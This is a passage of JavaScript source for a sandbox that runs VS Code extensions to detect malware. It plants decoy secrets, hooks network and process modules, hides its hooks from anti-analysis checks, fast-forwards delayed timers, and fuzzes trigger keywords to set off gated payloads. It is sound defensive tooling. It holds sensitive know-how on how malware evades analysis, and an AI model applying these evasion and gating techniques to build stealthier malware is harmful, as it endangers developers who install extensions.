      if (b.body)    console.log(`        body   : ${b.body.replace(/\s+/g, ' ').slice(0, 120)}`);
      if (b.decoded) console.log(`        decoded: ${b.decoded.replace(/\s+/g, ' ').slice(0, 120)}`);
    }
    if (BEACONS.length > 6) console.log(`    … and ${BEACONS.length - 6} more (see outbound_messages in the JSON)`);
  }

  // ── Verdict banner ────────────────────────────────────────────────────────
  const icon = verdict.verdict === 'MALICIOUS' ? '🔴' : verdict.verdict === 'SUSPICIOUS' ? '🟡' : '🟢';
  console.log(`  ${'-'.repeat(64)}`);
  console.log(`  ${icon} VERDICT          : ${verdict.verdict}  (score ${verdict.score})`);
  for (const r of verdict.reasons) {
    console.log(`        • (+${r.points}) ${r.reason}`);
  }
  if (verdict.verdict !== 'BENIGN') {
    console.log(`  Purpose          : ${intel.purpose}${intel.families.length ? '  [' + intel.families.join(', ') + ']' : ''}`);
    if (intel.actions.length)       console.log(`  Actions          : ${intel.actions.join(' | ').slice(0, 120)}`);
    if (intel.data_targeted.length) console.log(`  Data targeted    : ${intel.data_targeted.join(', ')}`);
    if (intel.network.length)       console.log(`  Network          : ${intel.network.slice(0, 4).map(n => `${n.domain || n.ip}${n.port ? ':' + n.port : ''}`).join(', ')}`);
    if (intel.c2_indicators.length) console.log(`  C2 indicators    : ${intel.c2_indicators.join(', ')}`);
  }

  console.log(`\n  Report saved → ${outputPath}`);
  console.log(SEP + '\n');
}


// ─────────────────────────────────────────────────────────────────────────────
//  Trigger-keyword harvester — for INPUT-GATED payloads
//  Some malware only fires when a "magic word" is typed into an input box /
//  quick pick (e.g. ChatGPT-B0T runs its reverse shell only when the chat input
//  contains "help"). We seed the mocked input APIs with likely gate words,
//  harvested from the source plus a default set.
// ─────────────────────────────────────────────────────────────────────────────

// ─────────────────────────────────────────────────────────────────────────────
//  ES-module → CommonJS shim (so ESM extensions execute in the CJS VM)
//  Handles the common esbuild/tsc ESM output forms. Best-effort: if anything is
//  left unconverted the script simply fails to load (same as before), so this can
//  only ever HELP coverage, never reduce it.
// ─────────────────────────────────────────────────────────────────────────────

function isEsmSource(src) {
  // top-of-file / statement-position import or export keywords
  return /(^|\n)\s*import[\s*{'"]/.test(src) || /(^|\n)\s*export\s*[\{*]/.test(src) ||
         /(^|\n)\s*export\s+(default|const|function|class|let|var)\b/.test(src);
}

function transpileEsmToCjs(src) {
  let s = src;
  try {
    // import * as N from "m"   →   const N = require("m")
    s = s.replace(/\bimport\s*\*\s*as\s+([A-Za-z_$][\w$]*)\s*from\s*(['"][^'"]+['"])/g, 'const $1 = require($2)');
    // import D, { a, b as c } from "m"  →  const _d=require("m"); const D=_d.default??_d; const {a,b:c}=_d
    s = s.replace(/\bimport\s+([A-Za-z_$][\w$]*)\s*,\s*\{([^}]*)\}\s*from\s*(['"][^'"]+['"])/g,
      (_, d, named, m) => `const __m_${d} = require(${m}); const ${d} = (__m_${d} && __m_${d}.default !== undefined) ? __m_${d}.default : __m_${d}; const {${named.replace(/\s+as\s+/g, ': ')}} = __m_${d};`);
    // import { a, b as c } from "m"   →   const { a, b: c } = require("m")
    s = s.replace(/\bimport\s*\{([^}]*)\}\s*from\s*(['"][^'"]+['"])/g, (_, named, m) => `const {${named.replace(/\s+as\s+/g, ': ')}} = require(${m})`);
    // import D from "m"   →   const D = (require("m").default ?? require("m"))
    s = s.replace(/\bimport\s+([A-Za-z_$][\w$]*)\s*from\s*(['"][^'"]+['"])/g, 'const __d_$1 = require($2); const $1 = (__d_$1 && __d_$1.default !== undefined) ? __d_$1.default : __d_$1;');
    // import "m"   →   require("m")
    s = s.replace(/\bimport\s*(['"][^'"]+['"])/g, 'require($1)');
    // export { a as b, c }   →   module.exports.b = a; module.exports.c = c;
    s = s.replace(/\bexport\s*\{([^}]*)\}\s*;?/g, (_, body) =>
      body.split(',').map(part => {
        part = part.trim(); if (!part) return '';
        const m = part.match(/^([\w$]+)(?:\s+as\s+([\w$]+))?$/);
        if (!m) return '';
        return `module.exports.${m[2] || m[1]} = ${m[1]};`;
      }).join(' '));
    // export default X   →   module.exports.default = X
    s = s.replace(/\bexport\s+default\s+/g, 'module.exports.default = ');
    // export const/let/var NAME = …   →   module.exports.NAME = …
    s = s.replace(/\bexport\s+(?:const|let|var)\s+([\w$]+)\s*=/g, 'module.exports.$1 =');
    // export [async] function/class NAME   →   module.exports.NAME = [async] function/class NAME
    s = s.replace(/\bexport\s+(async\s+function|function\s*\*?|class)\s+([\w$]+)/g, 'module.exports.$2 = $1 $2');
  } catch (e) { return src; }
  return s;
}


/** Fallback gate words, used when the specimen yields none of its own. */
const DEFAULT_TRIGGER_KEYWORDS = ['help', 'test', 'run', 'start', 'debug', 'scan', 'login', 'password', 'token', 'admin'];

/**
 * Harvest candidate "magic words" a payload might gate on.
 *
 * ORDERING IS THE WHOLE POINT. The words lifted from THIS specimen's own source
 * are the ones that actually unlock it; the generic defaults are a long shot.
 * v3.0 seeded the Set with the defaults first, so harvested words landed at the
 * tail and were cut by the `slice()` — a payload gated on `text.includes('apikey')`
 * never saw "apikey" because ten generic words were tried first and the budget
 * ran out. Harvested words now come first, defaults only pad the remainder.
 *
 * @param {string} src   the specimen's entry-point source
 * @param {number} limit how many to return
 * @returns {string[]}   specimen-derived keywords first, then generic fallbacks
 */
function harvestTriggerKeywords(src, limit = 14) {
  const harvested = [];
  const seen = new Set();
  if (typeof src === 'string') {
    // Comparison / membership tests against a string literal are where gates live:
    //   if (x === 'unlock')      switch(x){case 'unlock':}      s.includes('unlock')
    //   x.startsWith('unlock')   x.match(/unlock/)              x.indexOf('unlock')
    const re = /(?:\.includes|\.startsWith|\.endsWith|\.indexOf|\.match|===?|case)\s*\(?\s*['"]([a-zA-Z][a-zA-Z0-9 _-]{1,20})['"]/g;
    let m, n = 0;
    while ((m = re.exec(src)) !== null && n < 60) {
      const w = m[1].toLowerCase();
      if (!seen.has(w)) { seen.add(w); harvested.push(w); }
      n++;
    }
  }
  const out = harvested.slice(0, limit);
  for (const d of DEFAULT_TRIGGER_KEYWORDS) {
    if (out.length >= limit) break;
    if (!seen.has(d)) out.push(d);
  }
  return out;
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 15 — Main Sandbox Runner
// ─────────────────────────────────────────────────────────────────────────────

async function runSandbox(extensionDir, outputLogPath) {
  const SEP = '═'.repeat(68);
  console.log('\n' + SEP);
  console.log('  VSIX DYNAMIC ANALYSIS SANDBOX  v2.1');
  console.log(`  Target : ${extensionDir}`);
  console.log(`  Spoof  : platform=${SPOOF_PLATFORM} arch=${SPOOF_ARCH}  mode=${FAST ? 'batch-fast' : 'interactive'}`);
  console.log(SEP);

  const outputLog = outputLogPath || path.join(extensionDir, 'execution-log.json');

  // ── 15.0 Synthetic victim profile ────────────────────────────────────────
  // Give an infostealer something to steal. Without bait it reads nothing,
  // sends nothing, and scores BENIGN — the structural false negative that no
  // amount of rule-tuning can fix. Every decoy secret is pre-registered so the
  // taint layer recognises it the instant it appears in an outbound payload.
  DECOY_PROFILE = DECOY.create();
  const savedEnv = {};
  for (const [k, v] of Object.entries(DECOY_PROFILE.env)) {
    savedEnv[k] = process.env[k];
    process.env[k] = v;
  }
  // NOTE: decoy secrets are deliberately NOT registered as harness values.
  // They must be treated as the victim's data — the specimen reads them through
  // the fs hook, which registers them as taint sources, and any later match in
  // an outbound payload is then a genuine closed loop. Only values the HARNESS
  // injects to unlock code paths (fake auth tokens, below) are ignored.
  console.log(`  🍯 [DECOY] Victim profile at ${DECOY_PROFILE.home} (${DECOY_PROFILE.files.length} bait secrets)`);

  const restoreEnv = () => {
    for (const k of Object.keys(DECOY_PROFILE.env)) {
      if (savedEnv[k] === undefined) delete process.env[k]; else process.env[k] = savedEnv[k];
    }
    DECOY_PROFILE.cleanup();
  };

  // BUG FIX: previously restoreEnv() was only called from four explicit
  // return points below, not from a blanket try/finally — an uncaught
  // exception anywhere in between (VM execution, activate(), event
  // simulation, fast-forward, report generation) skipped cleanup entirely,
  // leaving the decoy profile directory on disk. Wrapping the whole
  // function body guarantees cleanup runs on every exit path. The existing
  // explicit restoreEnv() calls below are now redundant but harmless
  // (DECOY_PROFILE.cleanup() is idempotent — fs.rmSync with force:true) and
  // are left in place rather than restructured, to minimise the diff.
  try {

  // ── 15.1 Load extension metadata ─────────────────────────────────────────
  let pkg, mainFile;
  try {
    ({ pkg, mainFile } = await loadExtension(extensionDir));
  } catch (e) {
    console.error(`\n[FATAL] ${e.message}`);
    writeReport(outputLog, {}, e.message);
    restoreEnv();
    return;
  }

  console.log(`\n  Name       : ${pkg.displayName || pkg.name}`);
  console.log(`  Publisher  : ${pkg.publisher}`);
  console.log(`  Version    : ${pkg.version}`);
  console.log(`  Categories : ${(pkg.categories || []).join(', ')}`);
  console.log(`  Activation : ${(pkg.activationEvents || []).join(', ')}`);
  console.log(`  Entry file : ${mainFile || '(no main — pure data extension)'}`);

  if (!mainFile) {
    console.log('\n  [INFO] No JavaScript entry point. Extension is likely a pure theme or data package.');
    writeReport(outputLog, pkg);
    restoreEnv();
    return;
  }

  // ── 15.2 Build all hooked modules ─────────────────────────────────────────
  const fsHook = createFsHook();
  const hooked = {
    vscode:       require('./mock-vscode'),
    childProcess: createChildProcessHook(),
    http:         createHttpHook('http'),
    https:        createHttpHook('https'),
    fs:           fsHook,
    fsPromises:   createFsPromisesHook(fsHook),
    os:           createOsHook(),
    net:          createNetHook(),
    dns:          createDnsHook(),
    crypto:       createCryptoHook(),
    axios:        createAxiosHook(),   // FIX (Bug 3): intercept axios network calls
    // BUG FIX: previously unhooked entirely — real egress paths.
    tls:          createTlsHook(),
    dgram:        createDgramHook(),
    http2:        createHttp2Hook(),
  };

  // ── 15.2b Anti-analysis cloaking + Time Machine (Tasks 1 & 2) ─────────────
  // Cloak every hooked module function so `child_process.exec.toString()` (and
  // every other hook) reports native code. The Function.prototype.toString guard
  // installed in patchRequireCache also defeats the reflective bypass.
  for (const mod of [hooked.childProcess, hooked.http, hooked.https, hooked.fs,
                     hooked.os, hooked.net, hooked.dns, hooked.crypto, hooked.axios,
                     hooked.tls, hooked.dgram, hooked.http2]) {
    spoofModuleFunctions(mod);
  }
  // Instantiate the virtual-clock engine for this run. Its timer/Date globals are
  // injected into the VM context by buildVmContext(); its telemetry is streamed
  // to the live console only (kept OUT of LOG_EVENTS so it never crowds out or
  // biases the behavioural event stream the verdict is computed from).
  const tm = new TimeMachine({
    maxVirtualMs: Number(process.env.SANDBOX_MAX_VIRTUAL_MS) > 0
      ? Number(process.env.SANDBOX_MAX_VIRTUAL_MS) : undefined,   // default = 366 days
    // Guard rails for batch runs. The engine's own defaults (200 000 fires,
    // 1 000 ticks per interval) are fine for a single deep-dive but let one
    // extension with a 100 ms setInterval burn minutes of wall clock across a
    // 3 800-sample corpus. The FIRST few ticks already reveal what an interval
    // does; the rest is repetition.
    maxEvents:        Number(process.env.SANDBOX_MAX_TIMERS)   > 0 ? Number(process.env.SANDBOX_MAX_TIMERS)   : 20000,
    maxIntervalTicks: Number(process.env.SANDBOX_MAX_TICKS)    > 0 ? Number(process.env.SANDBOX_MAX_TICKS)    : 150,
    onEvent: (type, data) => {
      if (type === 'timer_fired' || type === 'fast_forward_complete' || type === 'horizon_reached')
        process.stdout.write(`  ⏩ [TIME] ${type} ${JSON.stringify(data).slice(0, 120)}\n`);
    },
  });
  TIME_MACHINE = tm;

  // ── 15.3 Patch global require.cache ───────────────────────────────────────
  // This intercepts transitive dependencies (e.g. a library inside node_modules
  // that also calls child_process) — not just the extension's own requires.
  // Also patches Module._resolveFilename (Bug 2) and follow-redirects (Bug 3b).
  const restoreCache = patchRequireCache(extensionDir, hooked);

  // ── 15.4 Build VM context ─────────────────────────────────────────────────
  const { context, fakeModule } = buildVmContext(extensionDir, mainFile, hooked, tm);

  // ── 15.5 Read and compile the main file ───────────────────────────────────
  let sourceCode;
  try {
    sourceCode = fs.readFileSync(mainFile, 'utf8');
  } catch (e) {
    console.error(`\n[FATAL] Cannot read main file: ${e.message}`);
    restoreCache();
    writeReport(outputLog, pkg, e.message);
    restoreEnv();
    return;
  }

  // The VM executes CommonJS. Many modern extensions ship ES-module output
  // (import/export), which would throw SyntaxError and never run (0 events).
  // Detect that and lightly transpile the esbuild-style ESM to CommonJS so the
  // extension's activate() is reachable and its behaviour can be observed.
  if (isEsmSource(sourceCode)) {
    const before = sourceCode;
    sourceCode = transpileEsmToCjs(sourceCode);
    if (sourceCode !== before) process.stdout.write('  🔵 [HOOK] ES-module entry transpiled to CommonJS for execution\n');
  }

  // Patch __filename / __dirname for multi-file extensions
  context.__filename = mainFile;
  context.__dirname  = path.dirname(mainFile);

  // ── 15.6 Execute the extension in the VM ──────────────────────────────────
  console.log('\n  [*] Executing extension code in VM context...\n');

  try {
    const script = new vm.Script(sourceCode, {
      filename:    mainFile,
      lineOffset:  0,
      columnOffset:0,
    });
    // Timeout of 10 s for the initial synchronous execution phase.
    // Malware that hangs waiting for network will hit this; async malware
    // that schedules via setTimeout will continue after this returns.
    script.runInContext(context, { timeout: 10000 });
  } catch (e) {
    if (e.code === 'ERR_SCRIPT_EXECUTION_TIMEOUT') {
      console.error('  [SANDBOX] Script exceeded 10 s sync timeout — likely blocking on network.\n');
    } else if (e instanceof SyntaxError) {
      console.error(`  [SANDBOX] SyntaxError in extension code: ${e.message}\n`);
    } else {
      // Most errors here are "Cannot read property X of undefined" because the
      // mock environment is incomplete. This is expected — we keep going.
      console.error(`  [SANDBOX] Execution error (expected in mock env): ${e.message}\n`);
    }
  }

  // Sync fakeModule.exports ↔ context.module.exports (the script may have
  // replaced module.exports rather than mutating it in place)
  const extensionExports = context.module.exports || fakeModule.exports;

  // ── 15.7 Call activate() ──────────────────────────────────────────────────
  //
  // FIX (Bug 5): Create mockCtx BEFORE calling activate() and pre-seed the
  // auth token. Extensions like secure-code check context.globalState for a
  // stored login token on every scan command — without a token the scanCommand
  // handler returns immediately (early exit) before making any network calls.
  // We pre-seed both the token and the plan tier so all code paths execute.
  const mockCtx = hooked.vscode._createExtensionContext(extensionDir);
  const HARNESS_TOKEN = 'sandbox-fake-token-csn304';
  // These are OUR values, injected purely to unlock gated code paths. Register
  // them so the taint layer never mistakes the extension echoing one back for
  // theft of the victim's data.
  DI.registerHarnessValue(HARNESS_TOKEN);
  DI.registerHarnessValue('gho_DECOYtokenForSandboxTaintTracing0001');
  for (const k of ['secure_code_token', 'token', 'accessToken', 'authToken', 'apiKey', 'api_key',
                   'licenseKey', 'license', 'sessionToken', 'userId', 'auth', 'jwt']) {
    mockCtx.globalState.update(k, HARNESS_TOKEN);
  }
  // Tier/flag keys: payloads frequently hide behind "is the user premium /
  // activated / first-run", so every plausible gate is opened.
  mockCtx.globalState.update('secure_code_plan', 'premium');
  for (const [k, v] of [['plan', 'premium'], ['tier', 'pro'], ['activated', true], ['licensed', true],
                        ['isPro', true], ['firstRun', true], ['installed', false], ['hasShownWelcome', false]]) {
    mockCtx.globalState.update(k, v);
  }
  // BUG FIX: only globalState was ever pre-seeded above. Real extensions
  // inconsistently pick globalState / workspaceState / secrets for this
  // exact kind of gating, so a payload gated on `context.secrets.get(...)`
  // or `context.workspaceState.get(...)` previously always saw
  // undefined/falsy and took its benign branch — silently never detonating.
  // Mirror the same gate-opening key set into both.
  for (const k of ['secure_code_token', 'token', 'accessToken', 'authToken', 'apiKey', 'api_key',
                   'licenseKey', 'license', 'sessionToken', 'userId', 'auth', 'jwt']) {
    mockCtx.workspaceState.update(k, HARNESS_TOKEN);
    mockCtx.secrets.store(k, HARNESS_TOKEN);
  }
  mockCtx.workspaceState.update('secure_code_plan', 'premium');
  for (const [k, v] of [['plan', 'premium'], ['tier', 'pro'], ['activated', true], ['licensed', true],
                        ['isPro', true], ['firstRun', true], ['installed', false], ['hasShownWelcome', false]]) {
    mockCtx.workspaceState.update(k, v);
  }

  if (typeof extensionExports.activate === 'function') {
    console.log('  [*] Calling exports.activate() ...\n');
    try {
      const ret = extensionExports.activate(mockCtx);
      if (ret && typeof ret.then === 'function') {
        // DEADLOCK GUARD.
        // `await ret` used to be unconditional, which hangs forever on the very
        // evasion this sandbox exists to defeat:
        //
        //     async function activate() { await sleep(30 * 86400e3); beacon(); }
        //
        // `sleep` resolves on a VIRTUAL timer, and virtual timers only fire when
        // the Time Machine fast-forwards — which happens later in this function.
        // So the harness waited on a promise whose resolution it was itself
        // blocking, until the outer per-sample timeout killed the process and
        // the sample was recorded as a timeout with zero events.
        //
        // Instead: never block indefinitely on activate(). Settle briefly, then
        // fast-forward to release any awaited virtual sleep, then give the
        // continuation a bounded window to run.
        const settled = ret.then(() => 'resolved', (e) => {
          console.error(`  [SANDBOX] activate() Promise rejected: ${e && e.message}`);
          return 'rejected';
        });
        const outcome = await Promise.race([settled, settle(CMD_MS).then(() => 'pending')]);

        if (outcome === 'pending') {
          process.stdout.write('  ⏩ [TIME] activate() is awaiting a delayed timer — fast-forwarding to release it\n');
          const pre = await tm.fastForward({ untilIdle: true });
          if (pre.fired) process.stdout.write(`  ⏩ [TIME] released activate() after ${pre.fired} virtual timer(s)\n`);
          // Bounded second chance for the continuation (and anything it schedules).
          await Promise.race([settled, settle(CMD_MS * 2)]);
        }
      }
    } catch (e) {
      console.error(`  [SANDBOX] activate() threw synchronously: ${e.message}\n`);
    }
    // Brief pause so any microtasks/promises kicked off by activate() resolve
    await settle(CMD_MS);
  } else {
    console.log('  [INFO] No exports.activate() found. Extension may use side-effect loading.\n');
  }

  // ── 15.8 Simulate VS Code events to trigger lazy / event-driven malware ──
  //
  // Many extensions (especially PUPs/greyware) only make network calls when a
  // real editor event fires — e.g. a file is opened or saved. If we never
  // simulate those events the extension sits completely idle and we see 0 hooks.
  //
  // We fire the most common activation triggers:
  //   1. onDidChangeActiveTextEditor  — user switches to a file
  //   2. onDidOpenTextDocument        — a document is opened
  //   3. onDidSaveTextDocument        — a document is saved
  //   4. executeCommand(scan*)        — explicitly invoke any registered scan cmd
  //
  // Note: the mock-vscode event emitters store listener refs internally.
  // We fire events through the _events map exported by mock-vscode.
  console.log('  [*] Simulating VS Code editor events to trigger lazy behaviour...\n');
  try {
    const mockVscode = hooked.vscode;

    // Build a realistic-looking mock document and editor. The path lives inside
    // the DECOY profile and the contents carry a marked secret, so an extension
    // that ships "the file you are editing" off-box produces a provable taint
    // flow instead of an unattributable blob.
    const docPath  = path.join(DECOY_PROFILE.home, 'Projects', 'app', 'src', 'main.js');
    const mockUri  = new mockVscode.Uri('file', '', docPath.replace(/\\/g, '/'), '', '');
    const BASE_DOC_TEXT = [
      'const AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/VEXGUARD-DECOY/bPxRfiCY";',
      'const fs = require("fs");',
      'function main() { console.log("vexguard decoy workspace document"); }',
      'module.exports = { main };',
    ].join('\n');
    // MUTABLE, because the fuzzing round below rewrites the document body with
    // harvested magic keywords and re-fires the document events. A payload that
    // gates on the CONTENT of the file being edited (rather than on a command
    // or an input box) is only reachable if getText() can change between fires.
    let docText   = BASE_DOC_TEXT;
    let docVersion = 1;
    const mockDoc  = {
      uri: mockUri, fileName: docPath,
      languageId: 'javascript', isDirty: false,
      isUntitled: false, isClosed: false, lineCount: 50,
      get version() { return docVersion; },
      getText:    () => docText,
      lineAt:     () => ({ lineNumber: 0, text: docText.split('\n')[0] || '', firstNonWhitespaceCharacterIndex: 0, isEmptyOrWhitespace: false, range: new mockVscode.Range(0,0,0,12) }),
      offsetAt:   () => 0, positionAt: () => new mockVscode.Position(0,0),
      validateRange:    (r) => r, validatePosition: (p) => p,
      getWordRangeAtPosition: () => undefined,
      save: () => Promise.resolve(true),
      eol: 1, encoding: 'utf8',
    };
    const mockEditor = {
      document: mockDoc,
      selection: new mockVscode.Selection(new mockVscode.Position(0,0), new mockVscode.Position(0,0)),
      selections: [], visibleRanges: [], options: { tabSize: 4, insertSpaces: true },
      viewColumn: 1,
      edit: (cb) => { cb({ replace: ()=>{}, insert: ()=>{}, delete: ()=>{}, setEndOfLine: ()=>{} }); return Promise.resolve(true); },
      setDecorations: ()=>{}, revealRange: ()=>{}, show: ()=>{}, hide: ()=>{}, insertSnippet: ()=>Promise.resolve(true),
    };

    // ── Fire EVERY simulatable VS Code event ──────────────────────────────
    // v2 fired four events. A payload wired to any other lifecycle hook —
    // window focus, configuration change, terminal open, file create, debug
    // session start, workspace-trust grant — sat idle and was scored BENIGN.
    // mock-vscode now exposes a named emitter for each of them, and each is
    // driven here with a correctly-shaped payload.
    mockVscode.window.activeTextEditor   = mockEditor;
    mockVscode.window.visibleTextEditors = [mockEditor];
    mockVscode.workspace.textDocuments   = [mockDoc];

    if (mockVscode._events) {
      const ev = mockVscode._events;
      const mockTerminal = { name: 'powershell', processId: Promise.resolve(4242),
                             creationOptions: {}, exitStatus: undefined, state: { isInteractedWith: true },
                             sendText: () => {}, show: () => {}, hide: () => {}, dispose: () => {} };
      const fileEvent = { files: [mockUri] };

      // [eventName, payload] — ordered roughly as a real session would unfold.
      const SEQUENCE = [
        ['onDidChangeWindowState',         { focused: true, active: true }],
        ['onDidChangeActiveColorTheme',    { kind: 2, label: 'Default Dark+' }],
        ['onDidGrantWorkspaceTrust',       undefined],
        ['onDidChangeConfiguration',       { affectsConfiguration: () => true }],
        ['onDidChangeWorkspaceFolders',    { added: mockVscode.workspace.workspaceFolders, removed: [] }],
        ['onDidChangeActiveTextEditor',    mockEditor],
        ['onDidChangeVisibleTextEditors',  [mockEditor]],
        ['onDidOpenTextDocument',          mockDoc],
        ['onDidChangeTextEditorSelection', { textEditor: mockEditor, selections: mockEditor.selections, kind: 1 }],
        ['onDidChangeTextDocument',        { document: mockDoc, reason: undefined,
                                             contentChanges: [{ range: new mockVscode.Range(0, 0, 0, 5), rangeOffset: 0, rangeLength: 5, text: 'const' }] }],
        ['onWillSaveTextDocument',         { document: mockDoc, reason: 1, waitUntil: () => {} }],
        ['onDidSaveTextDocument',          mockDoc],
        ['onDidCreateFiles',               fileEvent],
        ['onDidRenameFiles',               { files: [{ oldUri: mockUri, newUri: mockUri }] }],
        ['onDidDeleteFiles',               fileEvent],
        ['onDidOpenTerminal',              mockTerminal],
        ['onDidChangeActiveTerminal',      mockTerminal],
        ['onDidStartDebugSession',         { id: 'decoy-debug-1', type: 'node', name: 'Launch' }],
        ['onDidChangeActiveDebugSession',  { id: 'decoy-debug-1', type: 'node', name: 'Launch' }],
        ['onDidReceiveDebugSessionCustomEvent', { session: { id: 'decoy-debug-1' }, event: 'output', body: {} }],
        ['onDidChangeBreakpoints',         { added: [], removed: [], changed: [] }],
        ['onDidTerminateDebugSession',     { id: 'decoy-debug-1', type: 'node', name: 'Launch' }],
        ['onDidStartTask',                 { execution: { task: { name: 'build' } } }],
        ['onDidStartTaskProcess',          { execution: { task: { name: 'build' } }, processId: 4242 }],
        ['onDidEndTaskProcess',            { execution: { task: { name: 'build' } }, processId: 4242, exitCode: 0 }],
        ['onDidEndTask',                   { execution: { task: { name: 'build' } } }],
        ['onDidChangeSessions',            { provider: { id: 'github', label: 'GitHub' } }],
        ['extensionsOnDidChange',          undefined],
        ['onWillCreateFiles',              { files: [mockUri], waitUntil: () => {} }],
        ['onDidOpenNotebookDocument',      { uri: mockUri, notebookType: 'jupyter', cellCount: 1, getCells: () => [] }],
        ['onWillSaveNotebookDocument',     { notebook: { uri: mockUri, notebookType: 'jupyter' }, reason: 1, waitUntil: () => {} }],
        ['onDidChangeNotebookDocument',    { notebook: { uri: mockUri, notebookType: 'jupyter' }, contentChanges: [], cellChanges: [] }],
        ['onDidSaveNotebookDocument',      { uri: mockUri, notebookType: 'jupyter', cellCount: 1, getCells: () => [] }],
        ['onDidChangeNotebookCellExecutionState', { cell: {}, state: 2 }],
        ['onDidChangeDiagnostics',         { uris: [mockUri] }],
        ['onDidChangeTelemetryEnabled',    true],
        ['onDidChangeLogLevel',            3],
        ['onDidChangeShell',               'C:\\WINDOWS\\System32\\cmd.exe'],
        ['onDidChangeChatModels',          undefined],
        ['onDidChangeTabGroups',           { changed: [], opened: [], closed: [] }],
        ['onDidChangeTabs',                { changed: [], opened: [], closed: [] }],
        ['onDidChangeTextEditorViewColumn',    { textEditor: mockEditor, viewColumn: 1 }],
        ['onDidChangeTextEditorVisibleRanges', { textEditor: mockEditor, visibleRanges: [] }],
        ['onDidChangeTextEditorOptions',       { textEditor: mockEditor, options: {} }],
        ['onWillRenameFiles',              { files: [{ oldUri: mockUri, newUri: mockUri }], waitUntil: () => {} }],
        ['onWillDeleteFiles',              { files: [mockUri], waitUntil: () => {} }],
        ['onDidCloseNotebookDocument',     { uri: mockUri, notebookType: 'jupyter', cellCount: 1, getCells: () => [] }],
        ['onDidCloseTextDocument',         mockDoc],
        ['onDidCloseTerminal',             mockTerminal],
      ];

      let fired = 0;
      for (const [name, payload] of SEQUENCE) {
        const emitter = ev[name];
        if (!emitter || typeof emitter.fire !== 'function') continue;
        try { emitter.fire(payload); fired++; } catch (_) { /* listener threw — keep going */ }
        await settle(FAST ? 2 : 120);
      }
      process.stdout.write(`  🔵 [SIM] Fired ${fired}/${SEQUENCE.length} VS Code lifecycle events\n`);
      await settle(SETTLE_MS);
    }

    // ── FIX (Bug 4): Use the correct hyphenated command IDs ──────────────────
    // The extension registers 'secure-code.scan', 'secure-code.login', etc.
    // (with hyphens). The old code tried 'securecode.scan' (no hyphens) which
    // never matched anything in the registry, so 0 commands ever fired.
    //
    // Strategy:
    //   1. Log ALL registered commands (so we can see the real names)
    //   2. Execute scan/analysis commands by name to trigger network calls
    //   3. Also brute-force execute EVERY registered command as a fallback

    // Step 1 — log what actually got registered during activate()
    const registeredCmds = await mockVscode.commands.getCommands();
    if (registeredCmds.length > 0) {
      process.stdout.write(`  🔵 [SIM] Registered commands: ${registeredCmds.join(', ')}\n`);
    } else {
      process.stdout.write('  🟡 [SIM] No commands registered — extension may not have loaded sub-modules\n');
    }

    // Step 2 — set activeTextEditor on the window mock so scan commands find it
    mockVscode.window.activeTextEditor = mockEditor;

    // Step 3 — try known secure-code command names first (corrected from 'securecode.*')
    const priorityCmds = [
      'secure-code.scan',
      'secure-code.scanCurrentFile',
      'secure-code.login',
      // Generic patterns used by other extensions
      'extension.scan', 'extension.analyze', 'extension.check',
      'extension.activate', 'extension.start',
    ];
    for (const cmd of priorityCmds) {
      if (CMD_EXEC_COUNT >= MAX_CMD_EXEC) break;
      if (registeredCmds.includes(cmd) || priorityCmds.includes(cmd)) {
        try {
          process.stdout.write(`  🔵 [SIM] executeCommand('${cmd}')\n`);
          CMD_EXEC_COUNT++;
          await mockVscode.commands.executeCommand(cmd, mockEditor, mockDoc);
          await settle(CMD_MS);
        } catch (_) {}
      }
    }

    // Step 4 — brute-force execute every registered command not already tried
    for (const cmd of registeredCmds) {
      if (CMD_EXEC_COUNT >= MAX_CMD_EXEC) break;
      if (!priorityCmds.includes(cmd)) {
        try {
          process.stdout.write(`  🔵 [SIM] executeCommand('${cmd}') [brute-force]\n`);
          CMD_EXEC_COUNT++;
          await mockVscode.commands.executeCommand(cmd, mockEditor, mockDoc);
          await settle(SETTLE_MS);
        } catch (_) {}
      }
    }

    // Step 5 — keyword-seeded re-trigger for INPUT-GATED payloads.
    // Replays every command while feeding candidate "magic words" into the
    // mocked input box / quick pick, so payloads gated on typed input fire
    // (e.g. ChatGPT-B0T's reverse shell only runs when the chat input
    // contains "help").
    try {
      const seeds     = harvestTriggerKeywords(sourceCode);
      const allCmds   = registeredCmds.slice();
      const origInput = mockVscode.window.showInputBox;
      const origPick  = mockVscode.window.showQuickPick;
      if (allCmds.length && seeds.length) {
        process.stdout.write(`  🔵 [SIM] Keyword-gated re-trigger (${seeds.length} seeds)\n`);
        for (const seed of seeds) {
          if (CMD_EXEC_COUNT >= MAX_CMD_EXEC) { process.stdout.write('  🟡 [SIM] command-execution cap reached — stopping re-trigger\n'); break; }
          mockVscode.window.showInputBox  = () => Promise.resolve(seed);
          mockVscode.window.showQuickPick = (items) => Promise.resolve(
            Array.isArray(items)
              ? (items.find(i => String((i && i.label) || i).toLowerCase().includes(seed)) || items[0])
              : seed);
          for (const cmd of allCmds) {
            if (CMD_EXEC_COUNT >= MAX_CMD_EXEC) break;
            CMD_EXEC_COUNT++;
            try { await mockVscode.commands.executeCommand(cmd, mockEditor, mockDoc); } catch (_) {}
          }
          await settle(FAST ? 2 : 150);
        }
        mockVscode.window.showInputBox  = origInput;
        mockVscode.window.showQuickPick = origPick;
      }
    } catch (_) {}

    // ── Step 6 — DOCUMENT-CONTENT fuzzing ───────────────────────────────────
    // Step 5 seeds magic words into the INPUT BOX. A different and equally
    // common gate reads the CONTENT of the file being edited:
    //
    //     onDidSaveTextDocument(doc => {
    //       if (doc.getText().includes('password')) beacon(doc.getText());
    //     });
    //
    // Firing the document events once with a fixed body can never satisfy that.
    // Here we rewrite the document with each harvested keyword — as a comment,
    // an identifier and a string literal, so `includes()`, a regex and a word
    // match all have something to bite on — and re-fire the document lifecycle
    // events per round. Bounded by FUZZ_ROUNDS so a corpus run stays feasible.
    try {
      const seeds = harvestTriggerKeywords(sourceCode);
      const FUZZ_EVENTS = ['onDidChangeTextDocument', 'onWillSaveTextDocument',
                           'onDidSaveTextDocument', 'onDidChangeActiveTextEditor',
                           'onDidChangeTextEditorSelection'];
      const FUZZ_ROUNDS = Number(process.env.SANDBOX_FUZZ_ROUNDS) > 0
        ? Number(process.env.SANDBOX_FUZZ_ROUNDS) : (FAST ? 6 : 12);
      const rounds = seeds.slice(0, FUZZ_ROUNDS);

      // GATE ON ACTUAL SUBSCRIBERS.
      // Fuzzing is only meaningful if the extension registered a document
      // listener. Running it unconditionally cost 13 extra timeouts across the
      // VsMex corpus — and 3 detections — by spending the per-sample budget
      // firing events into extensions that were not listening.
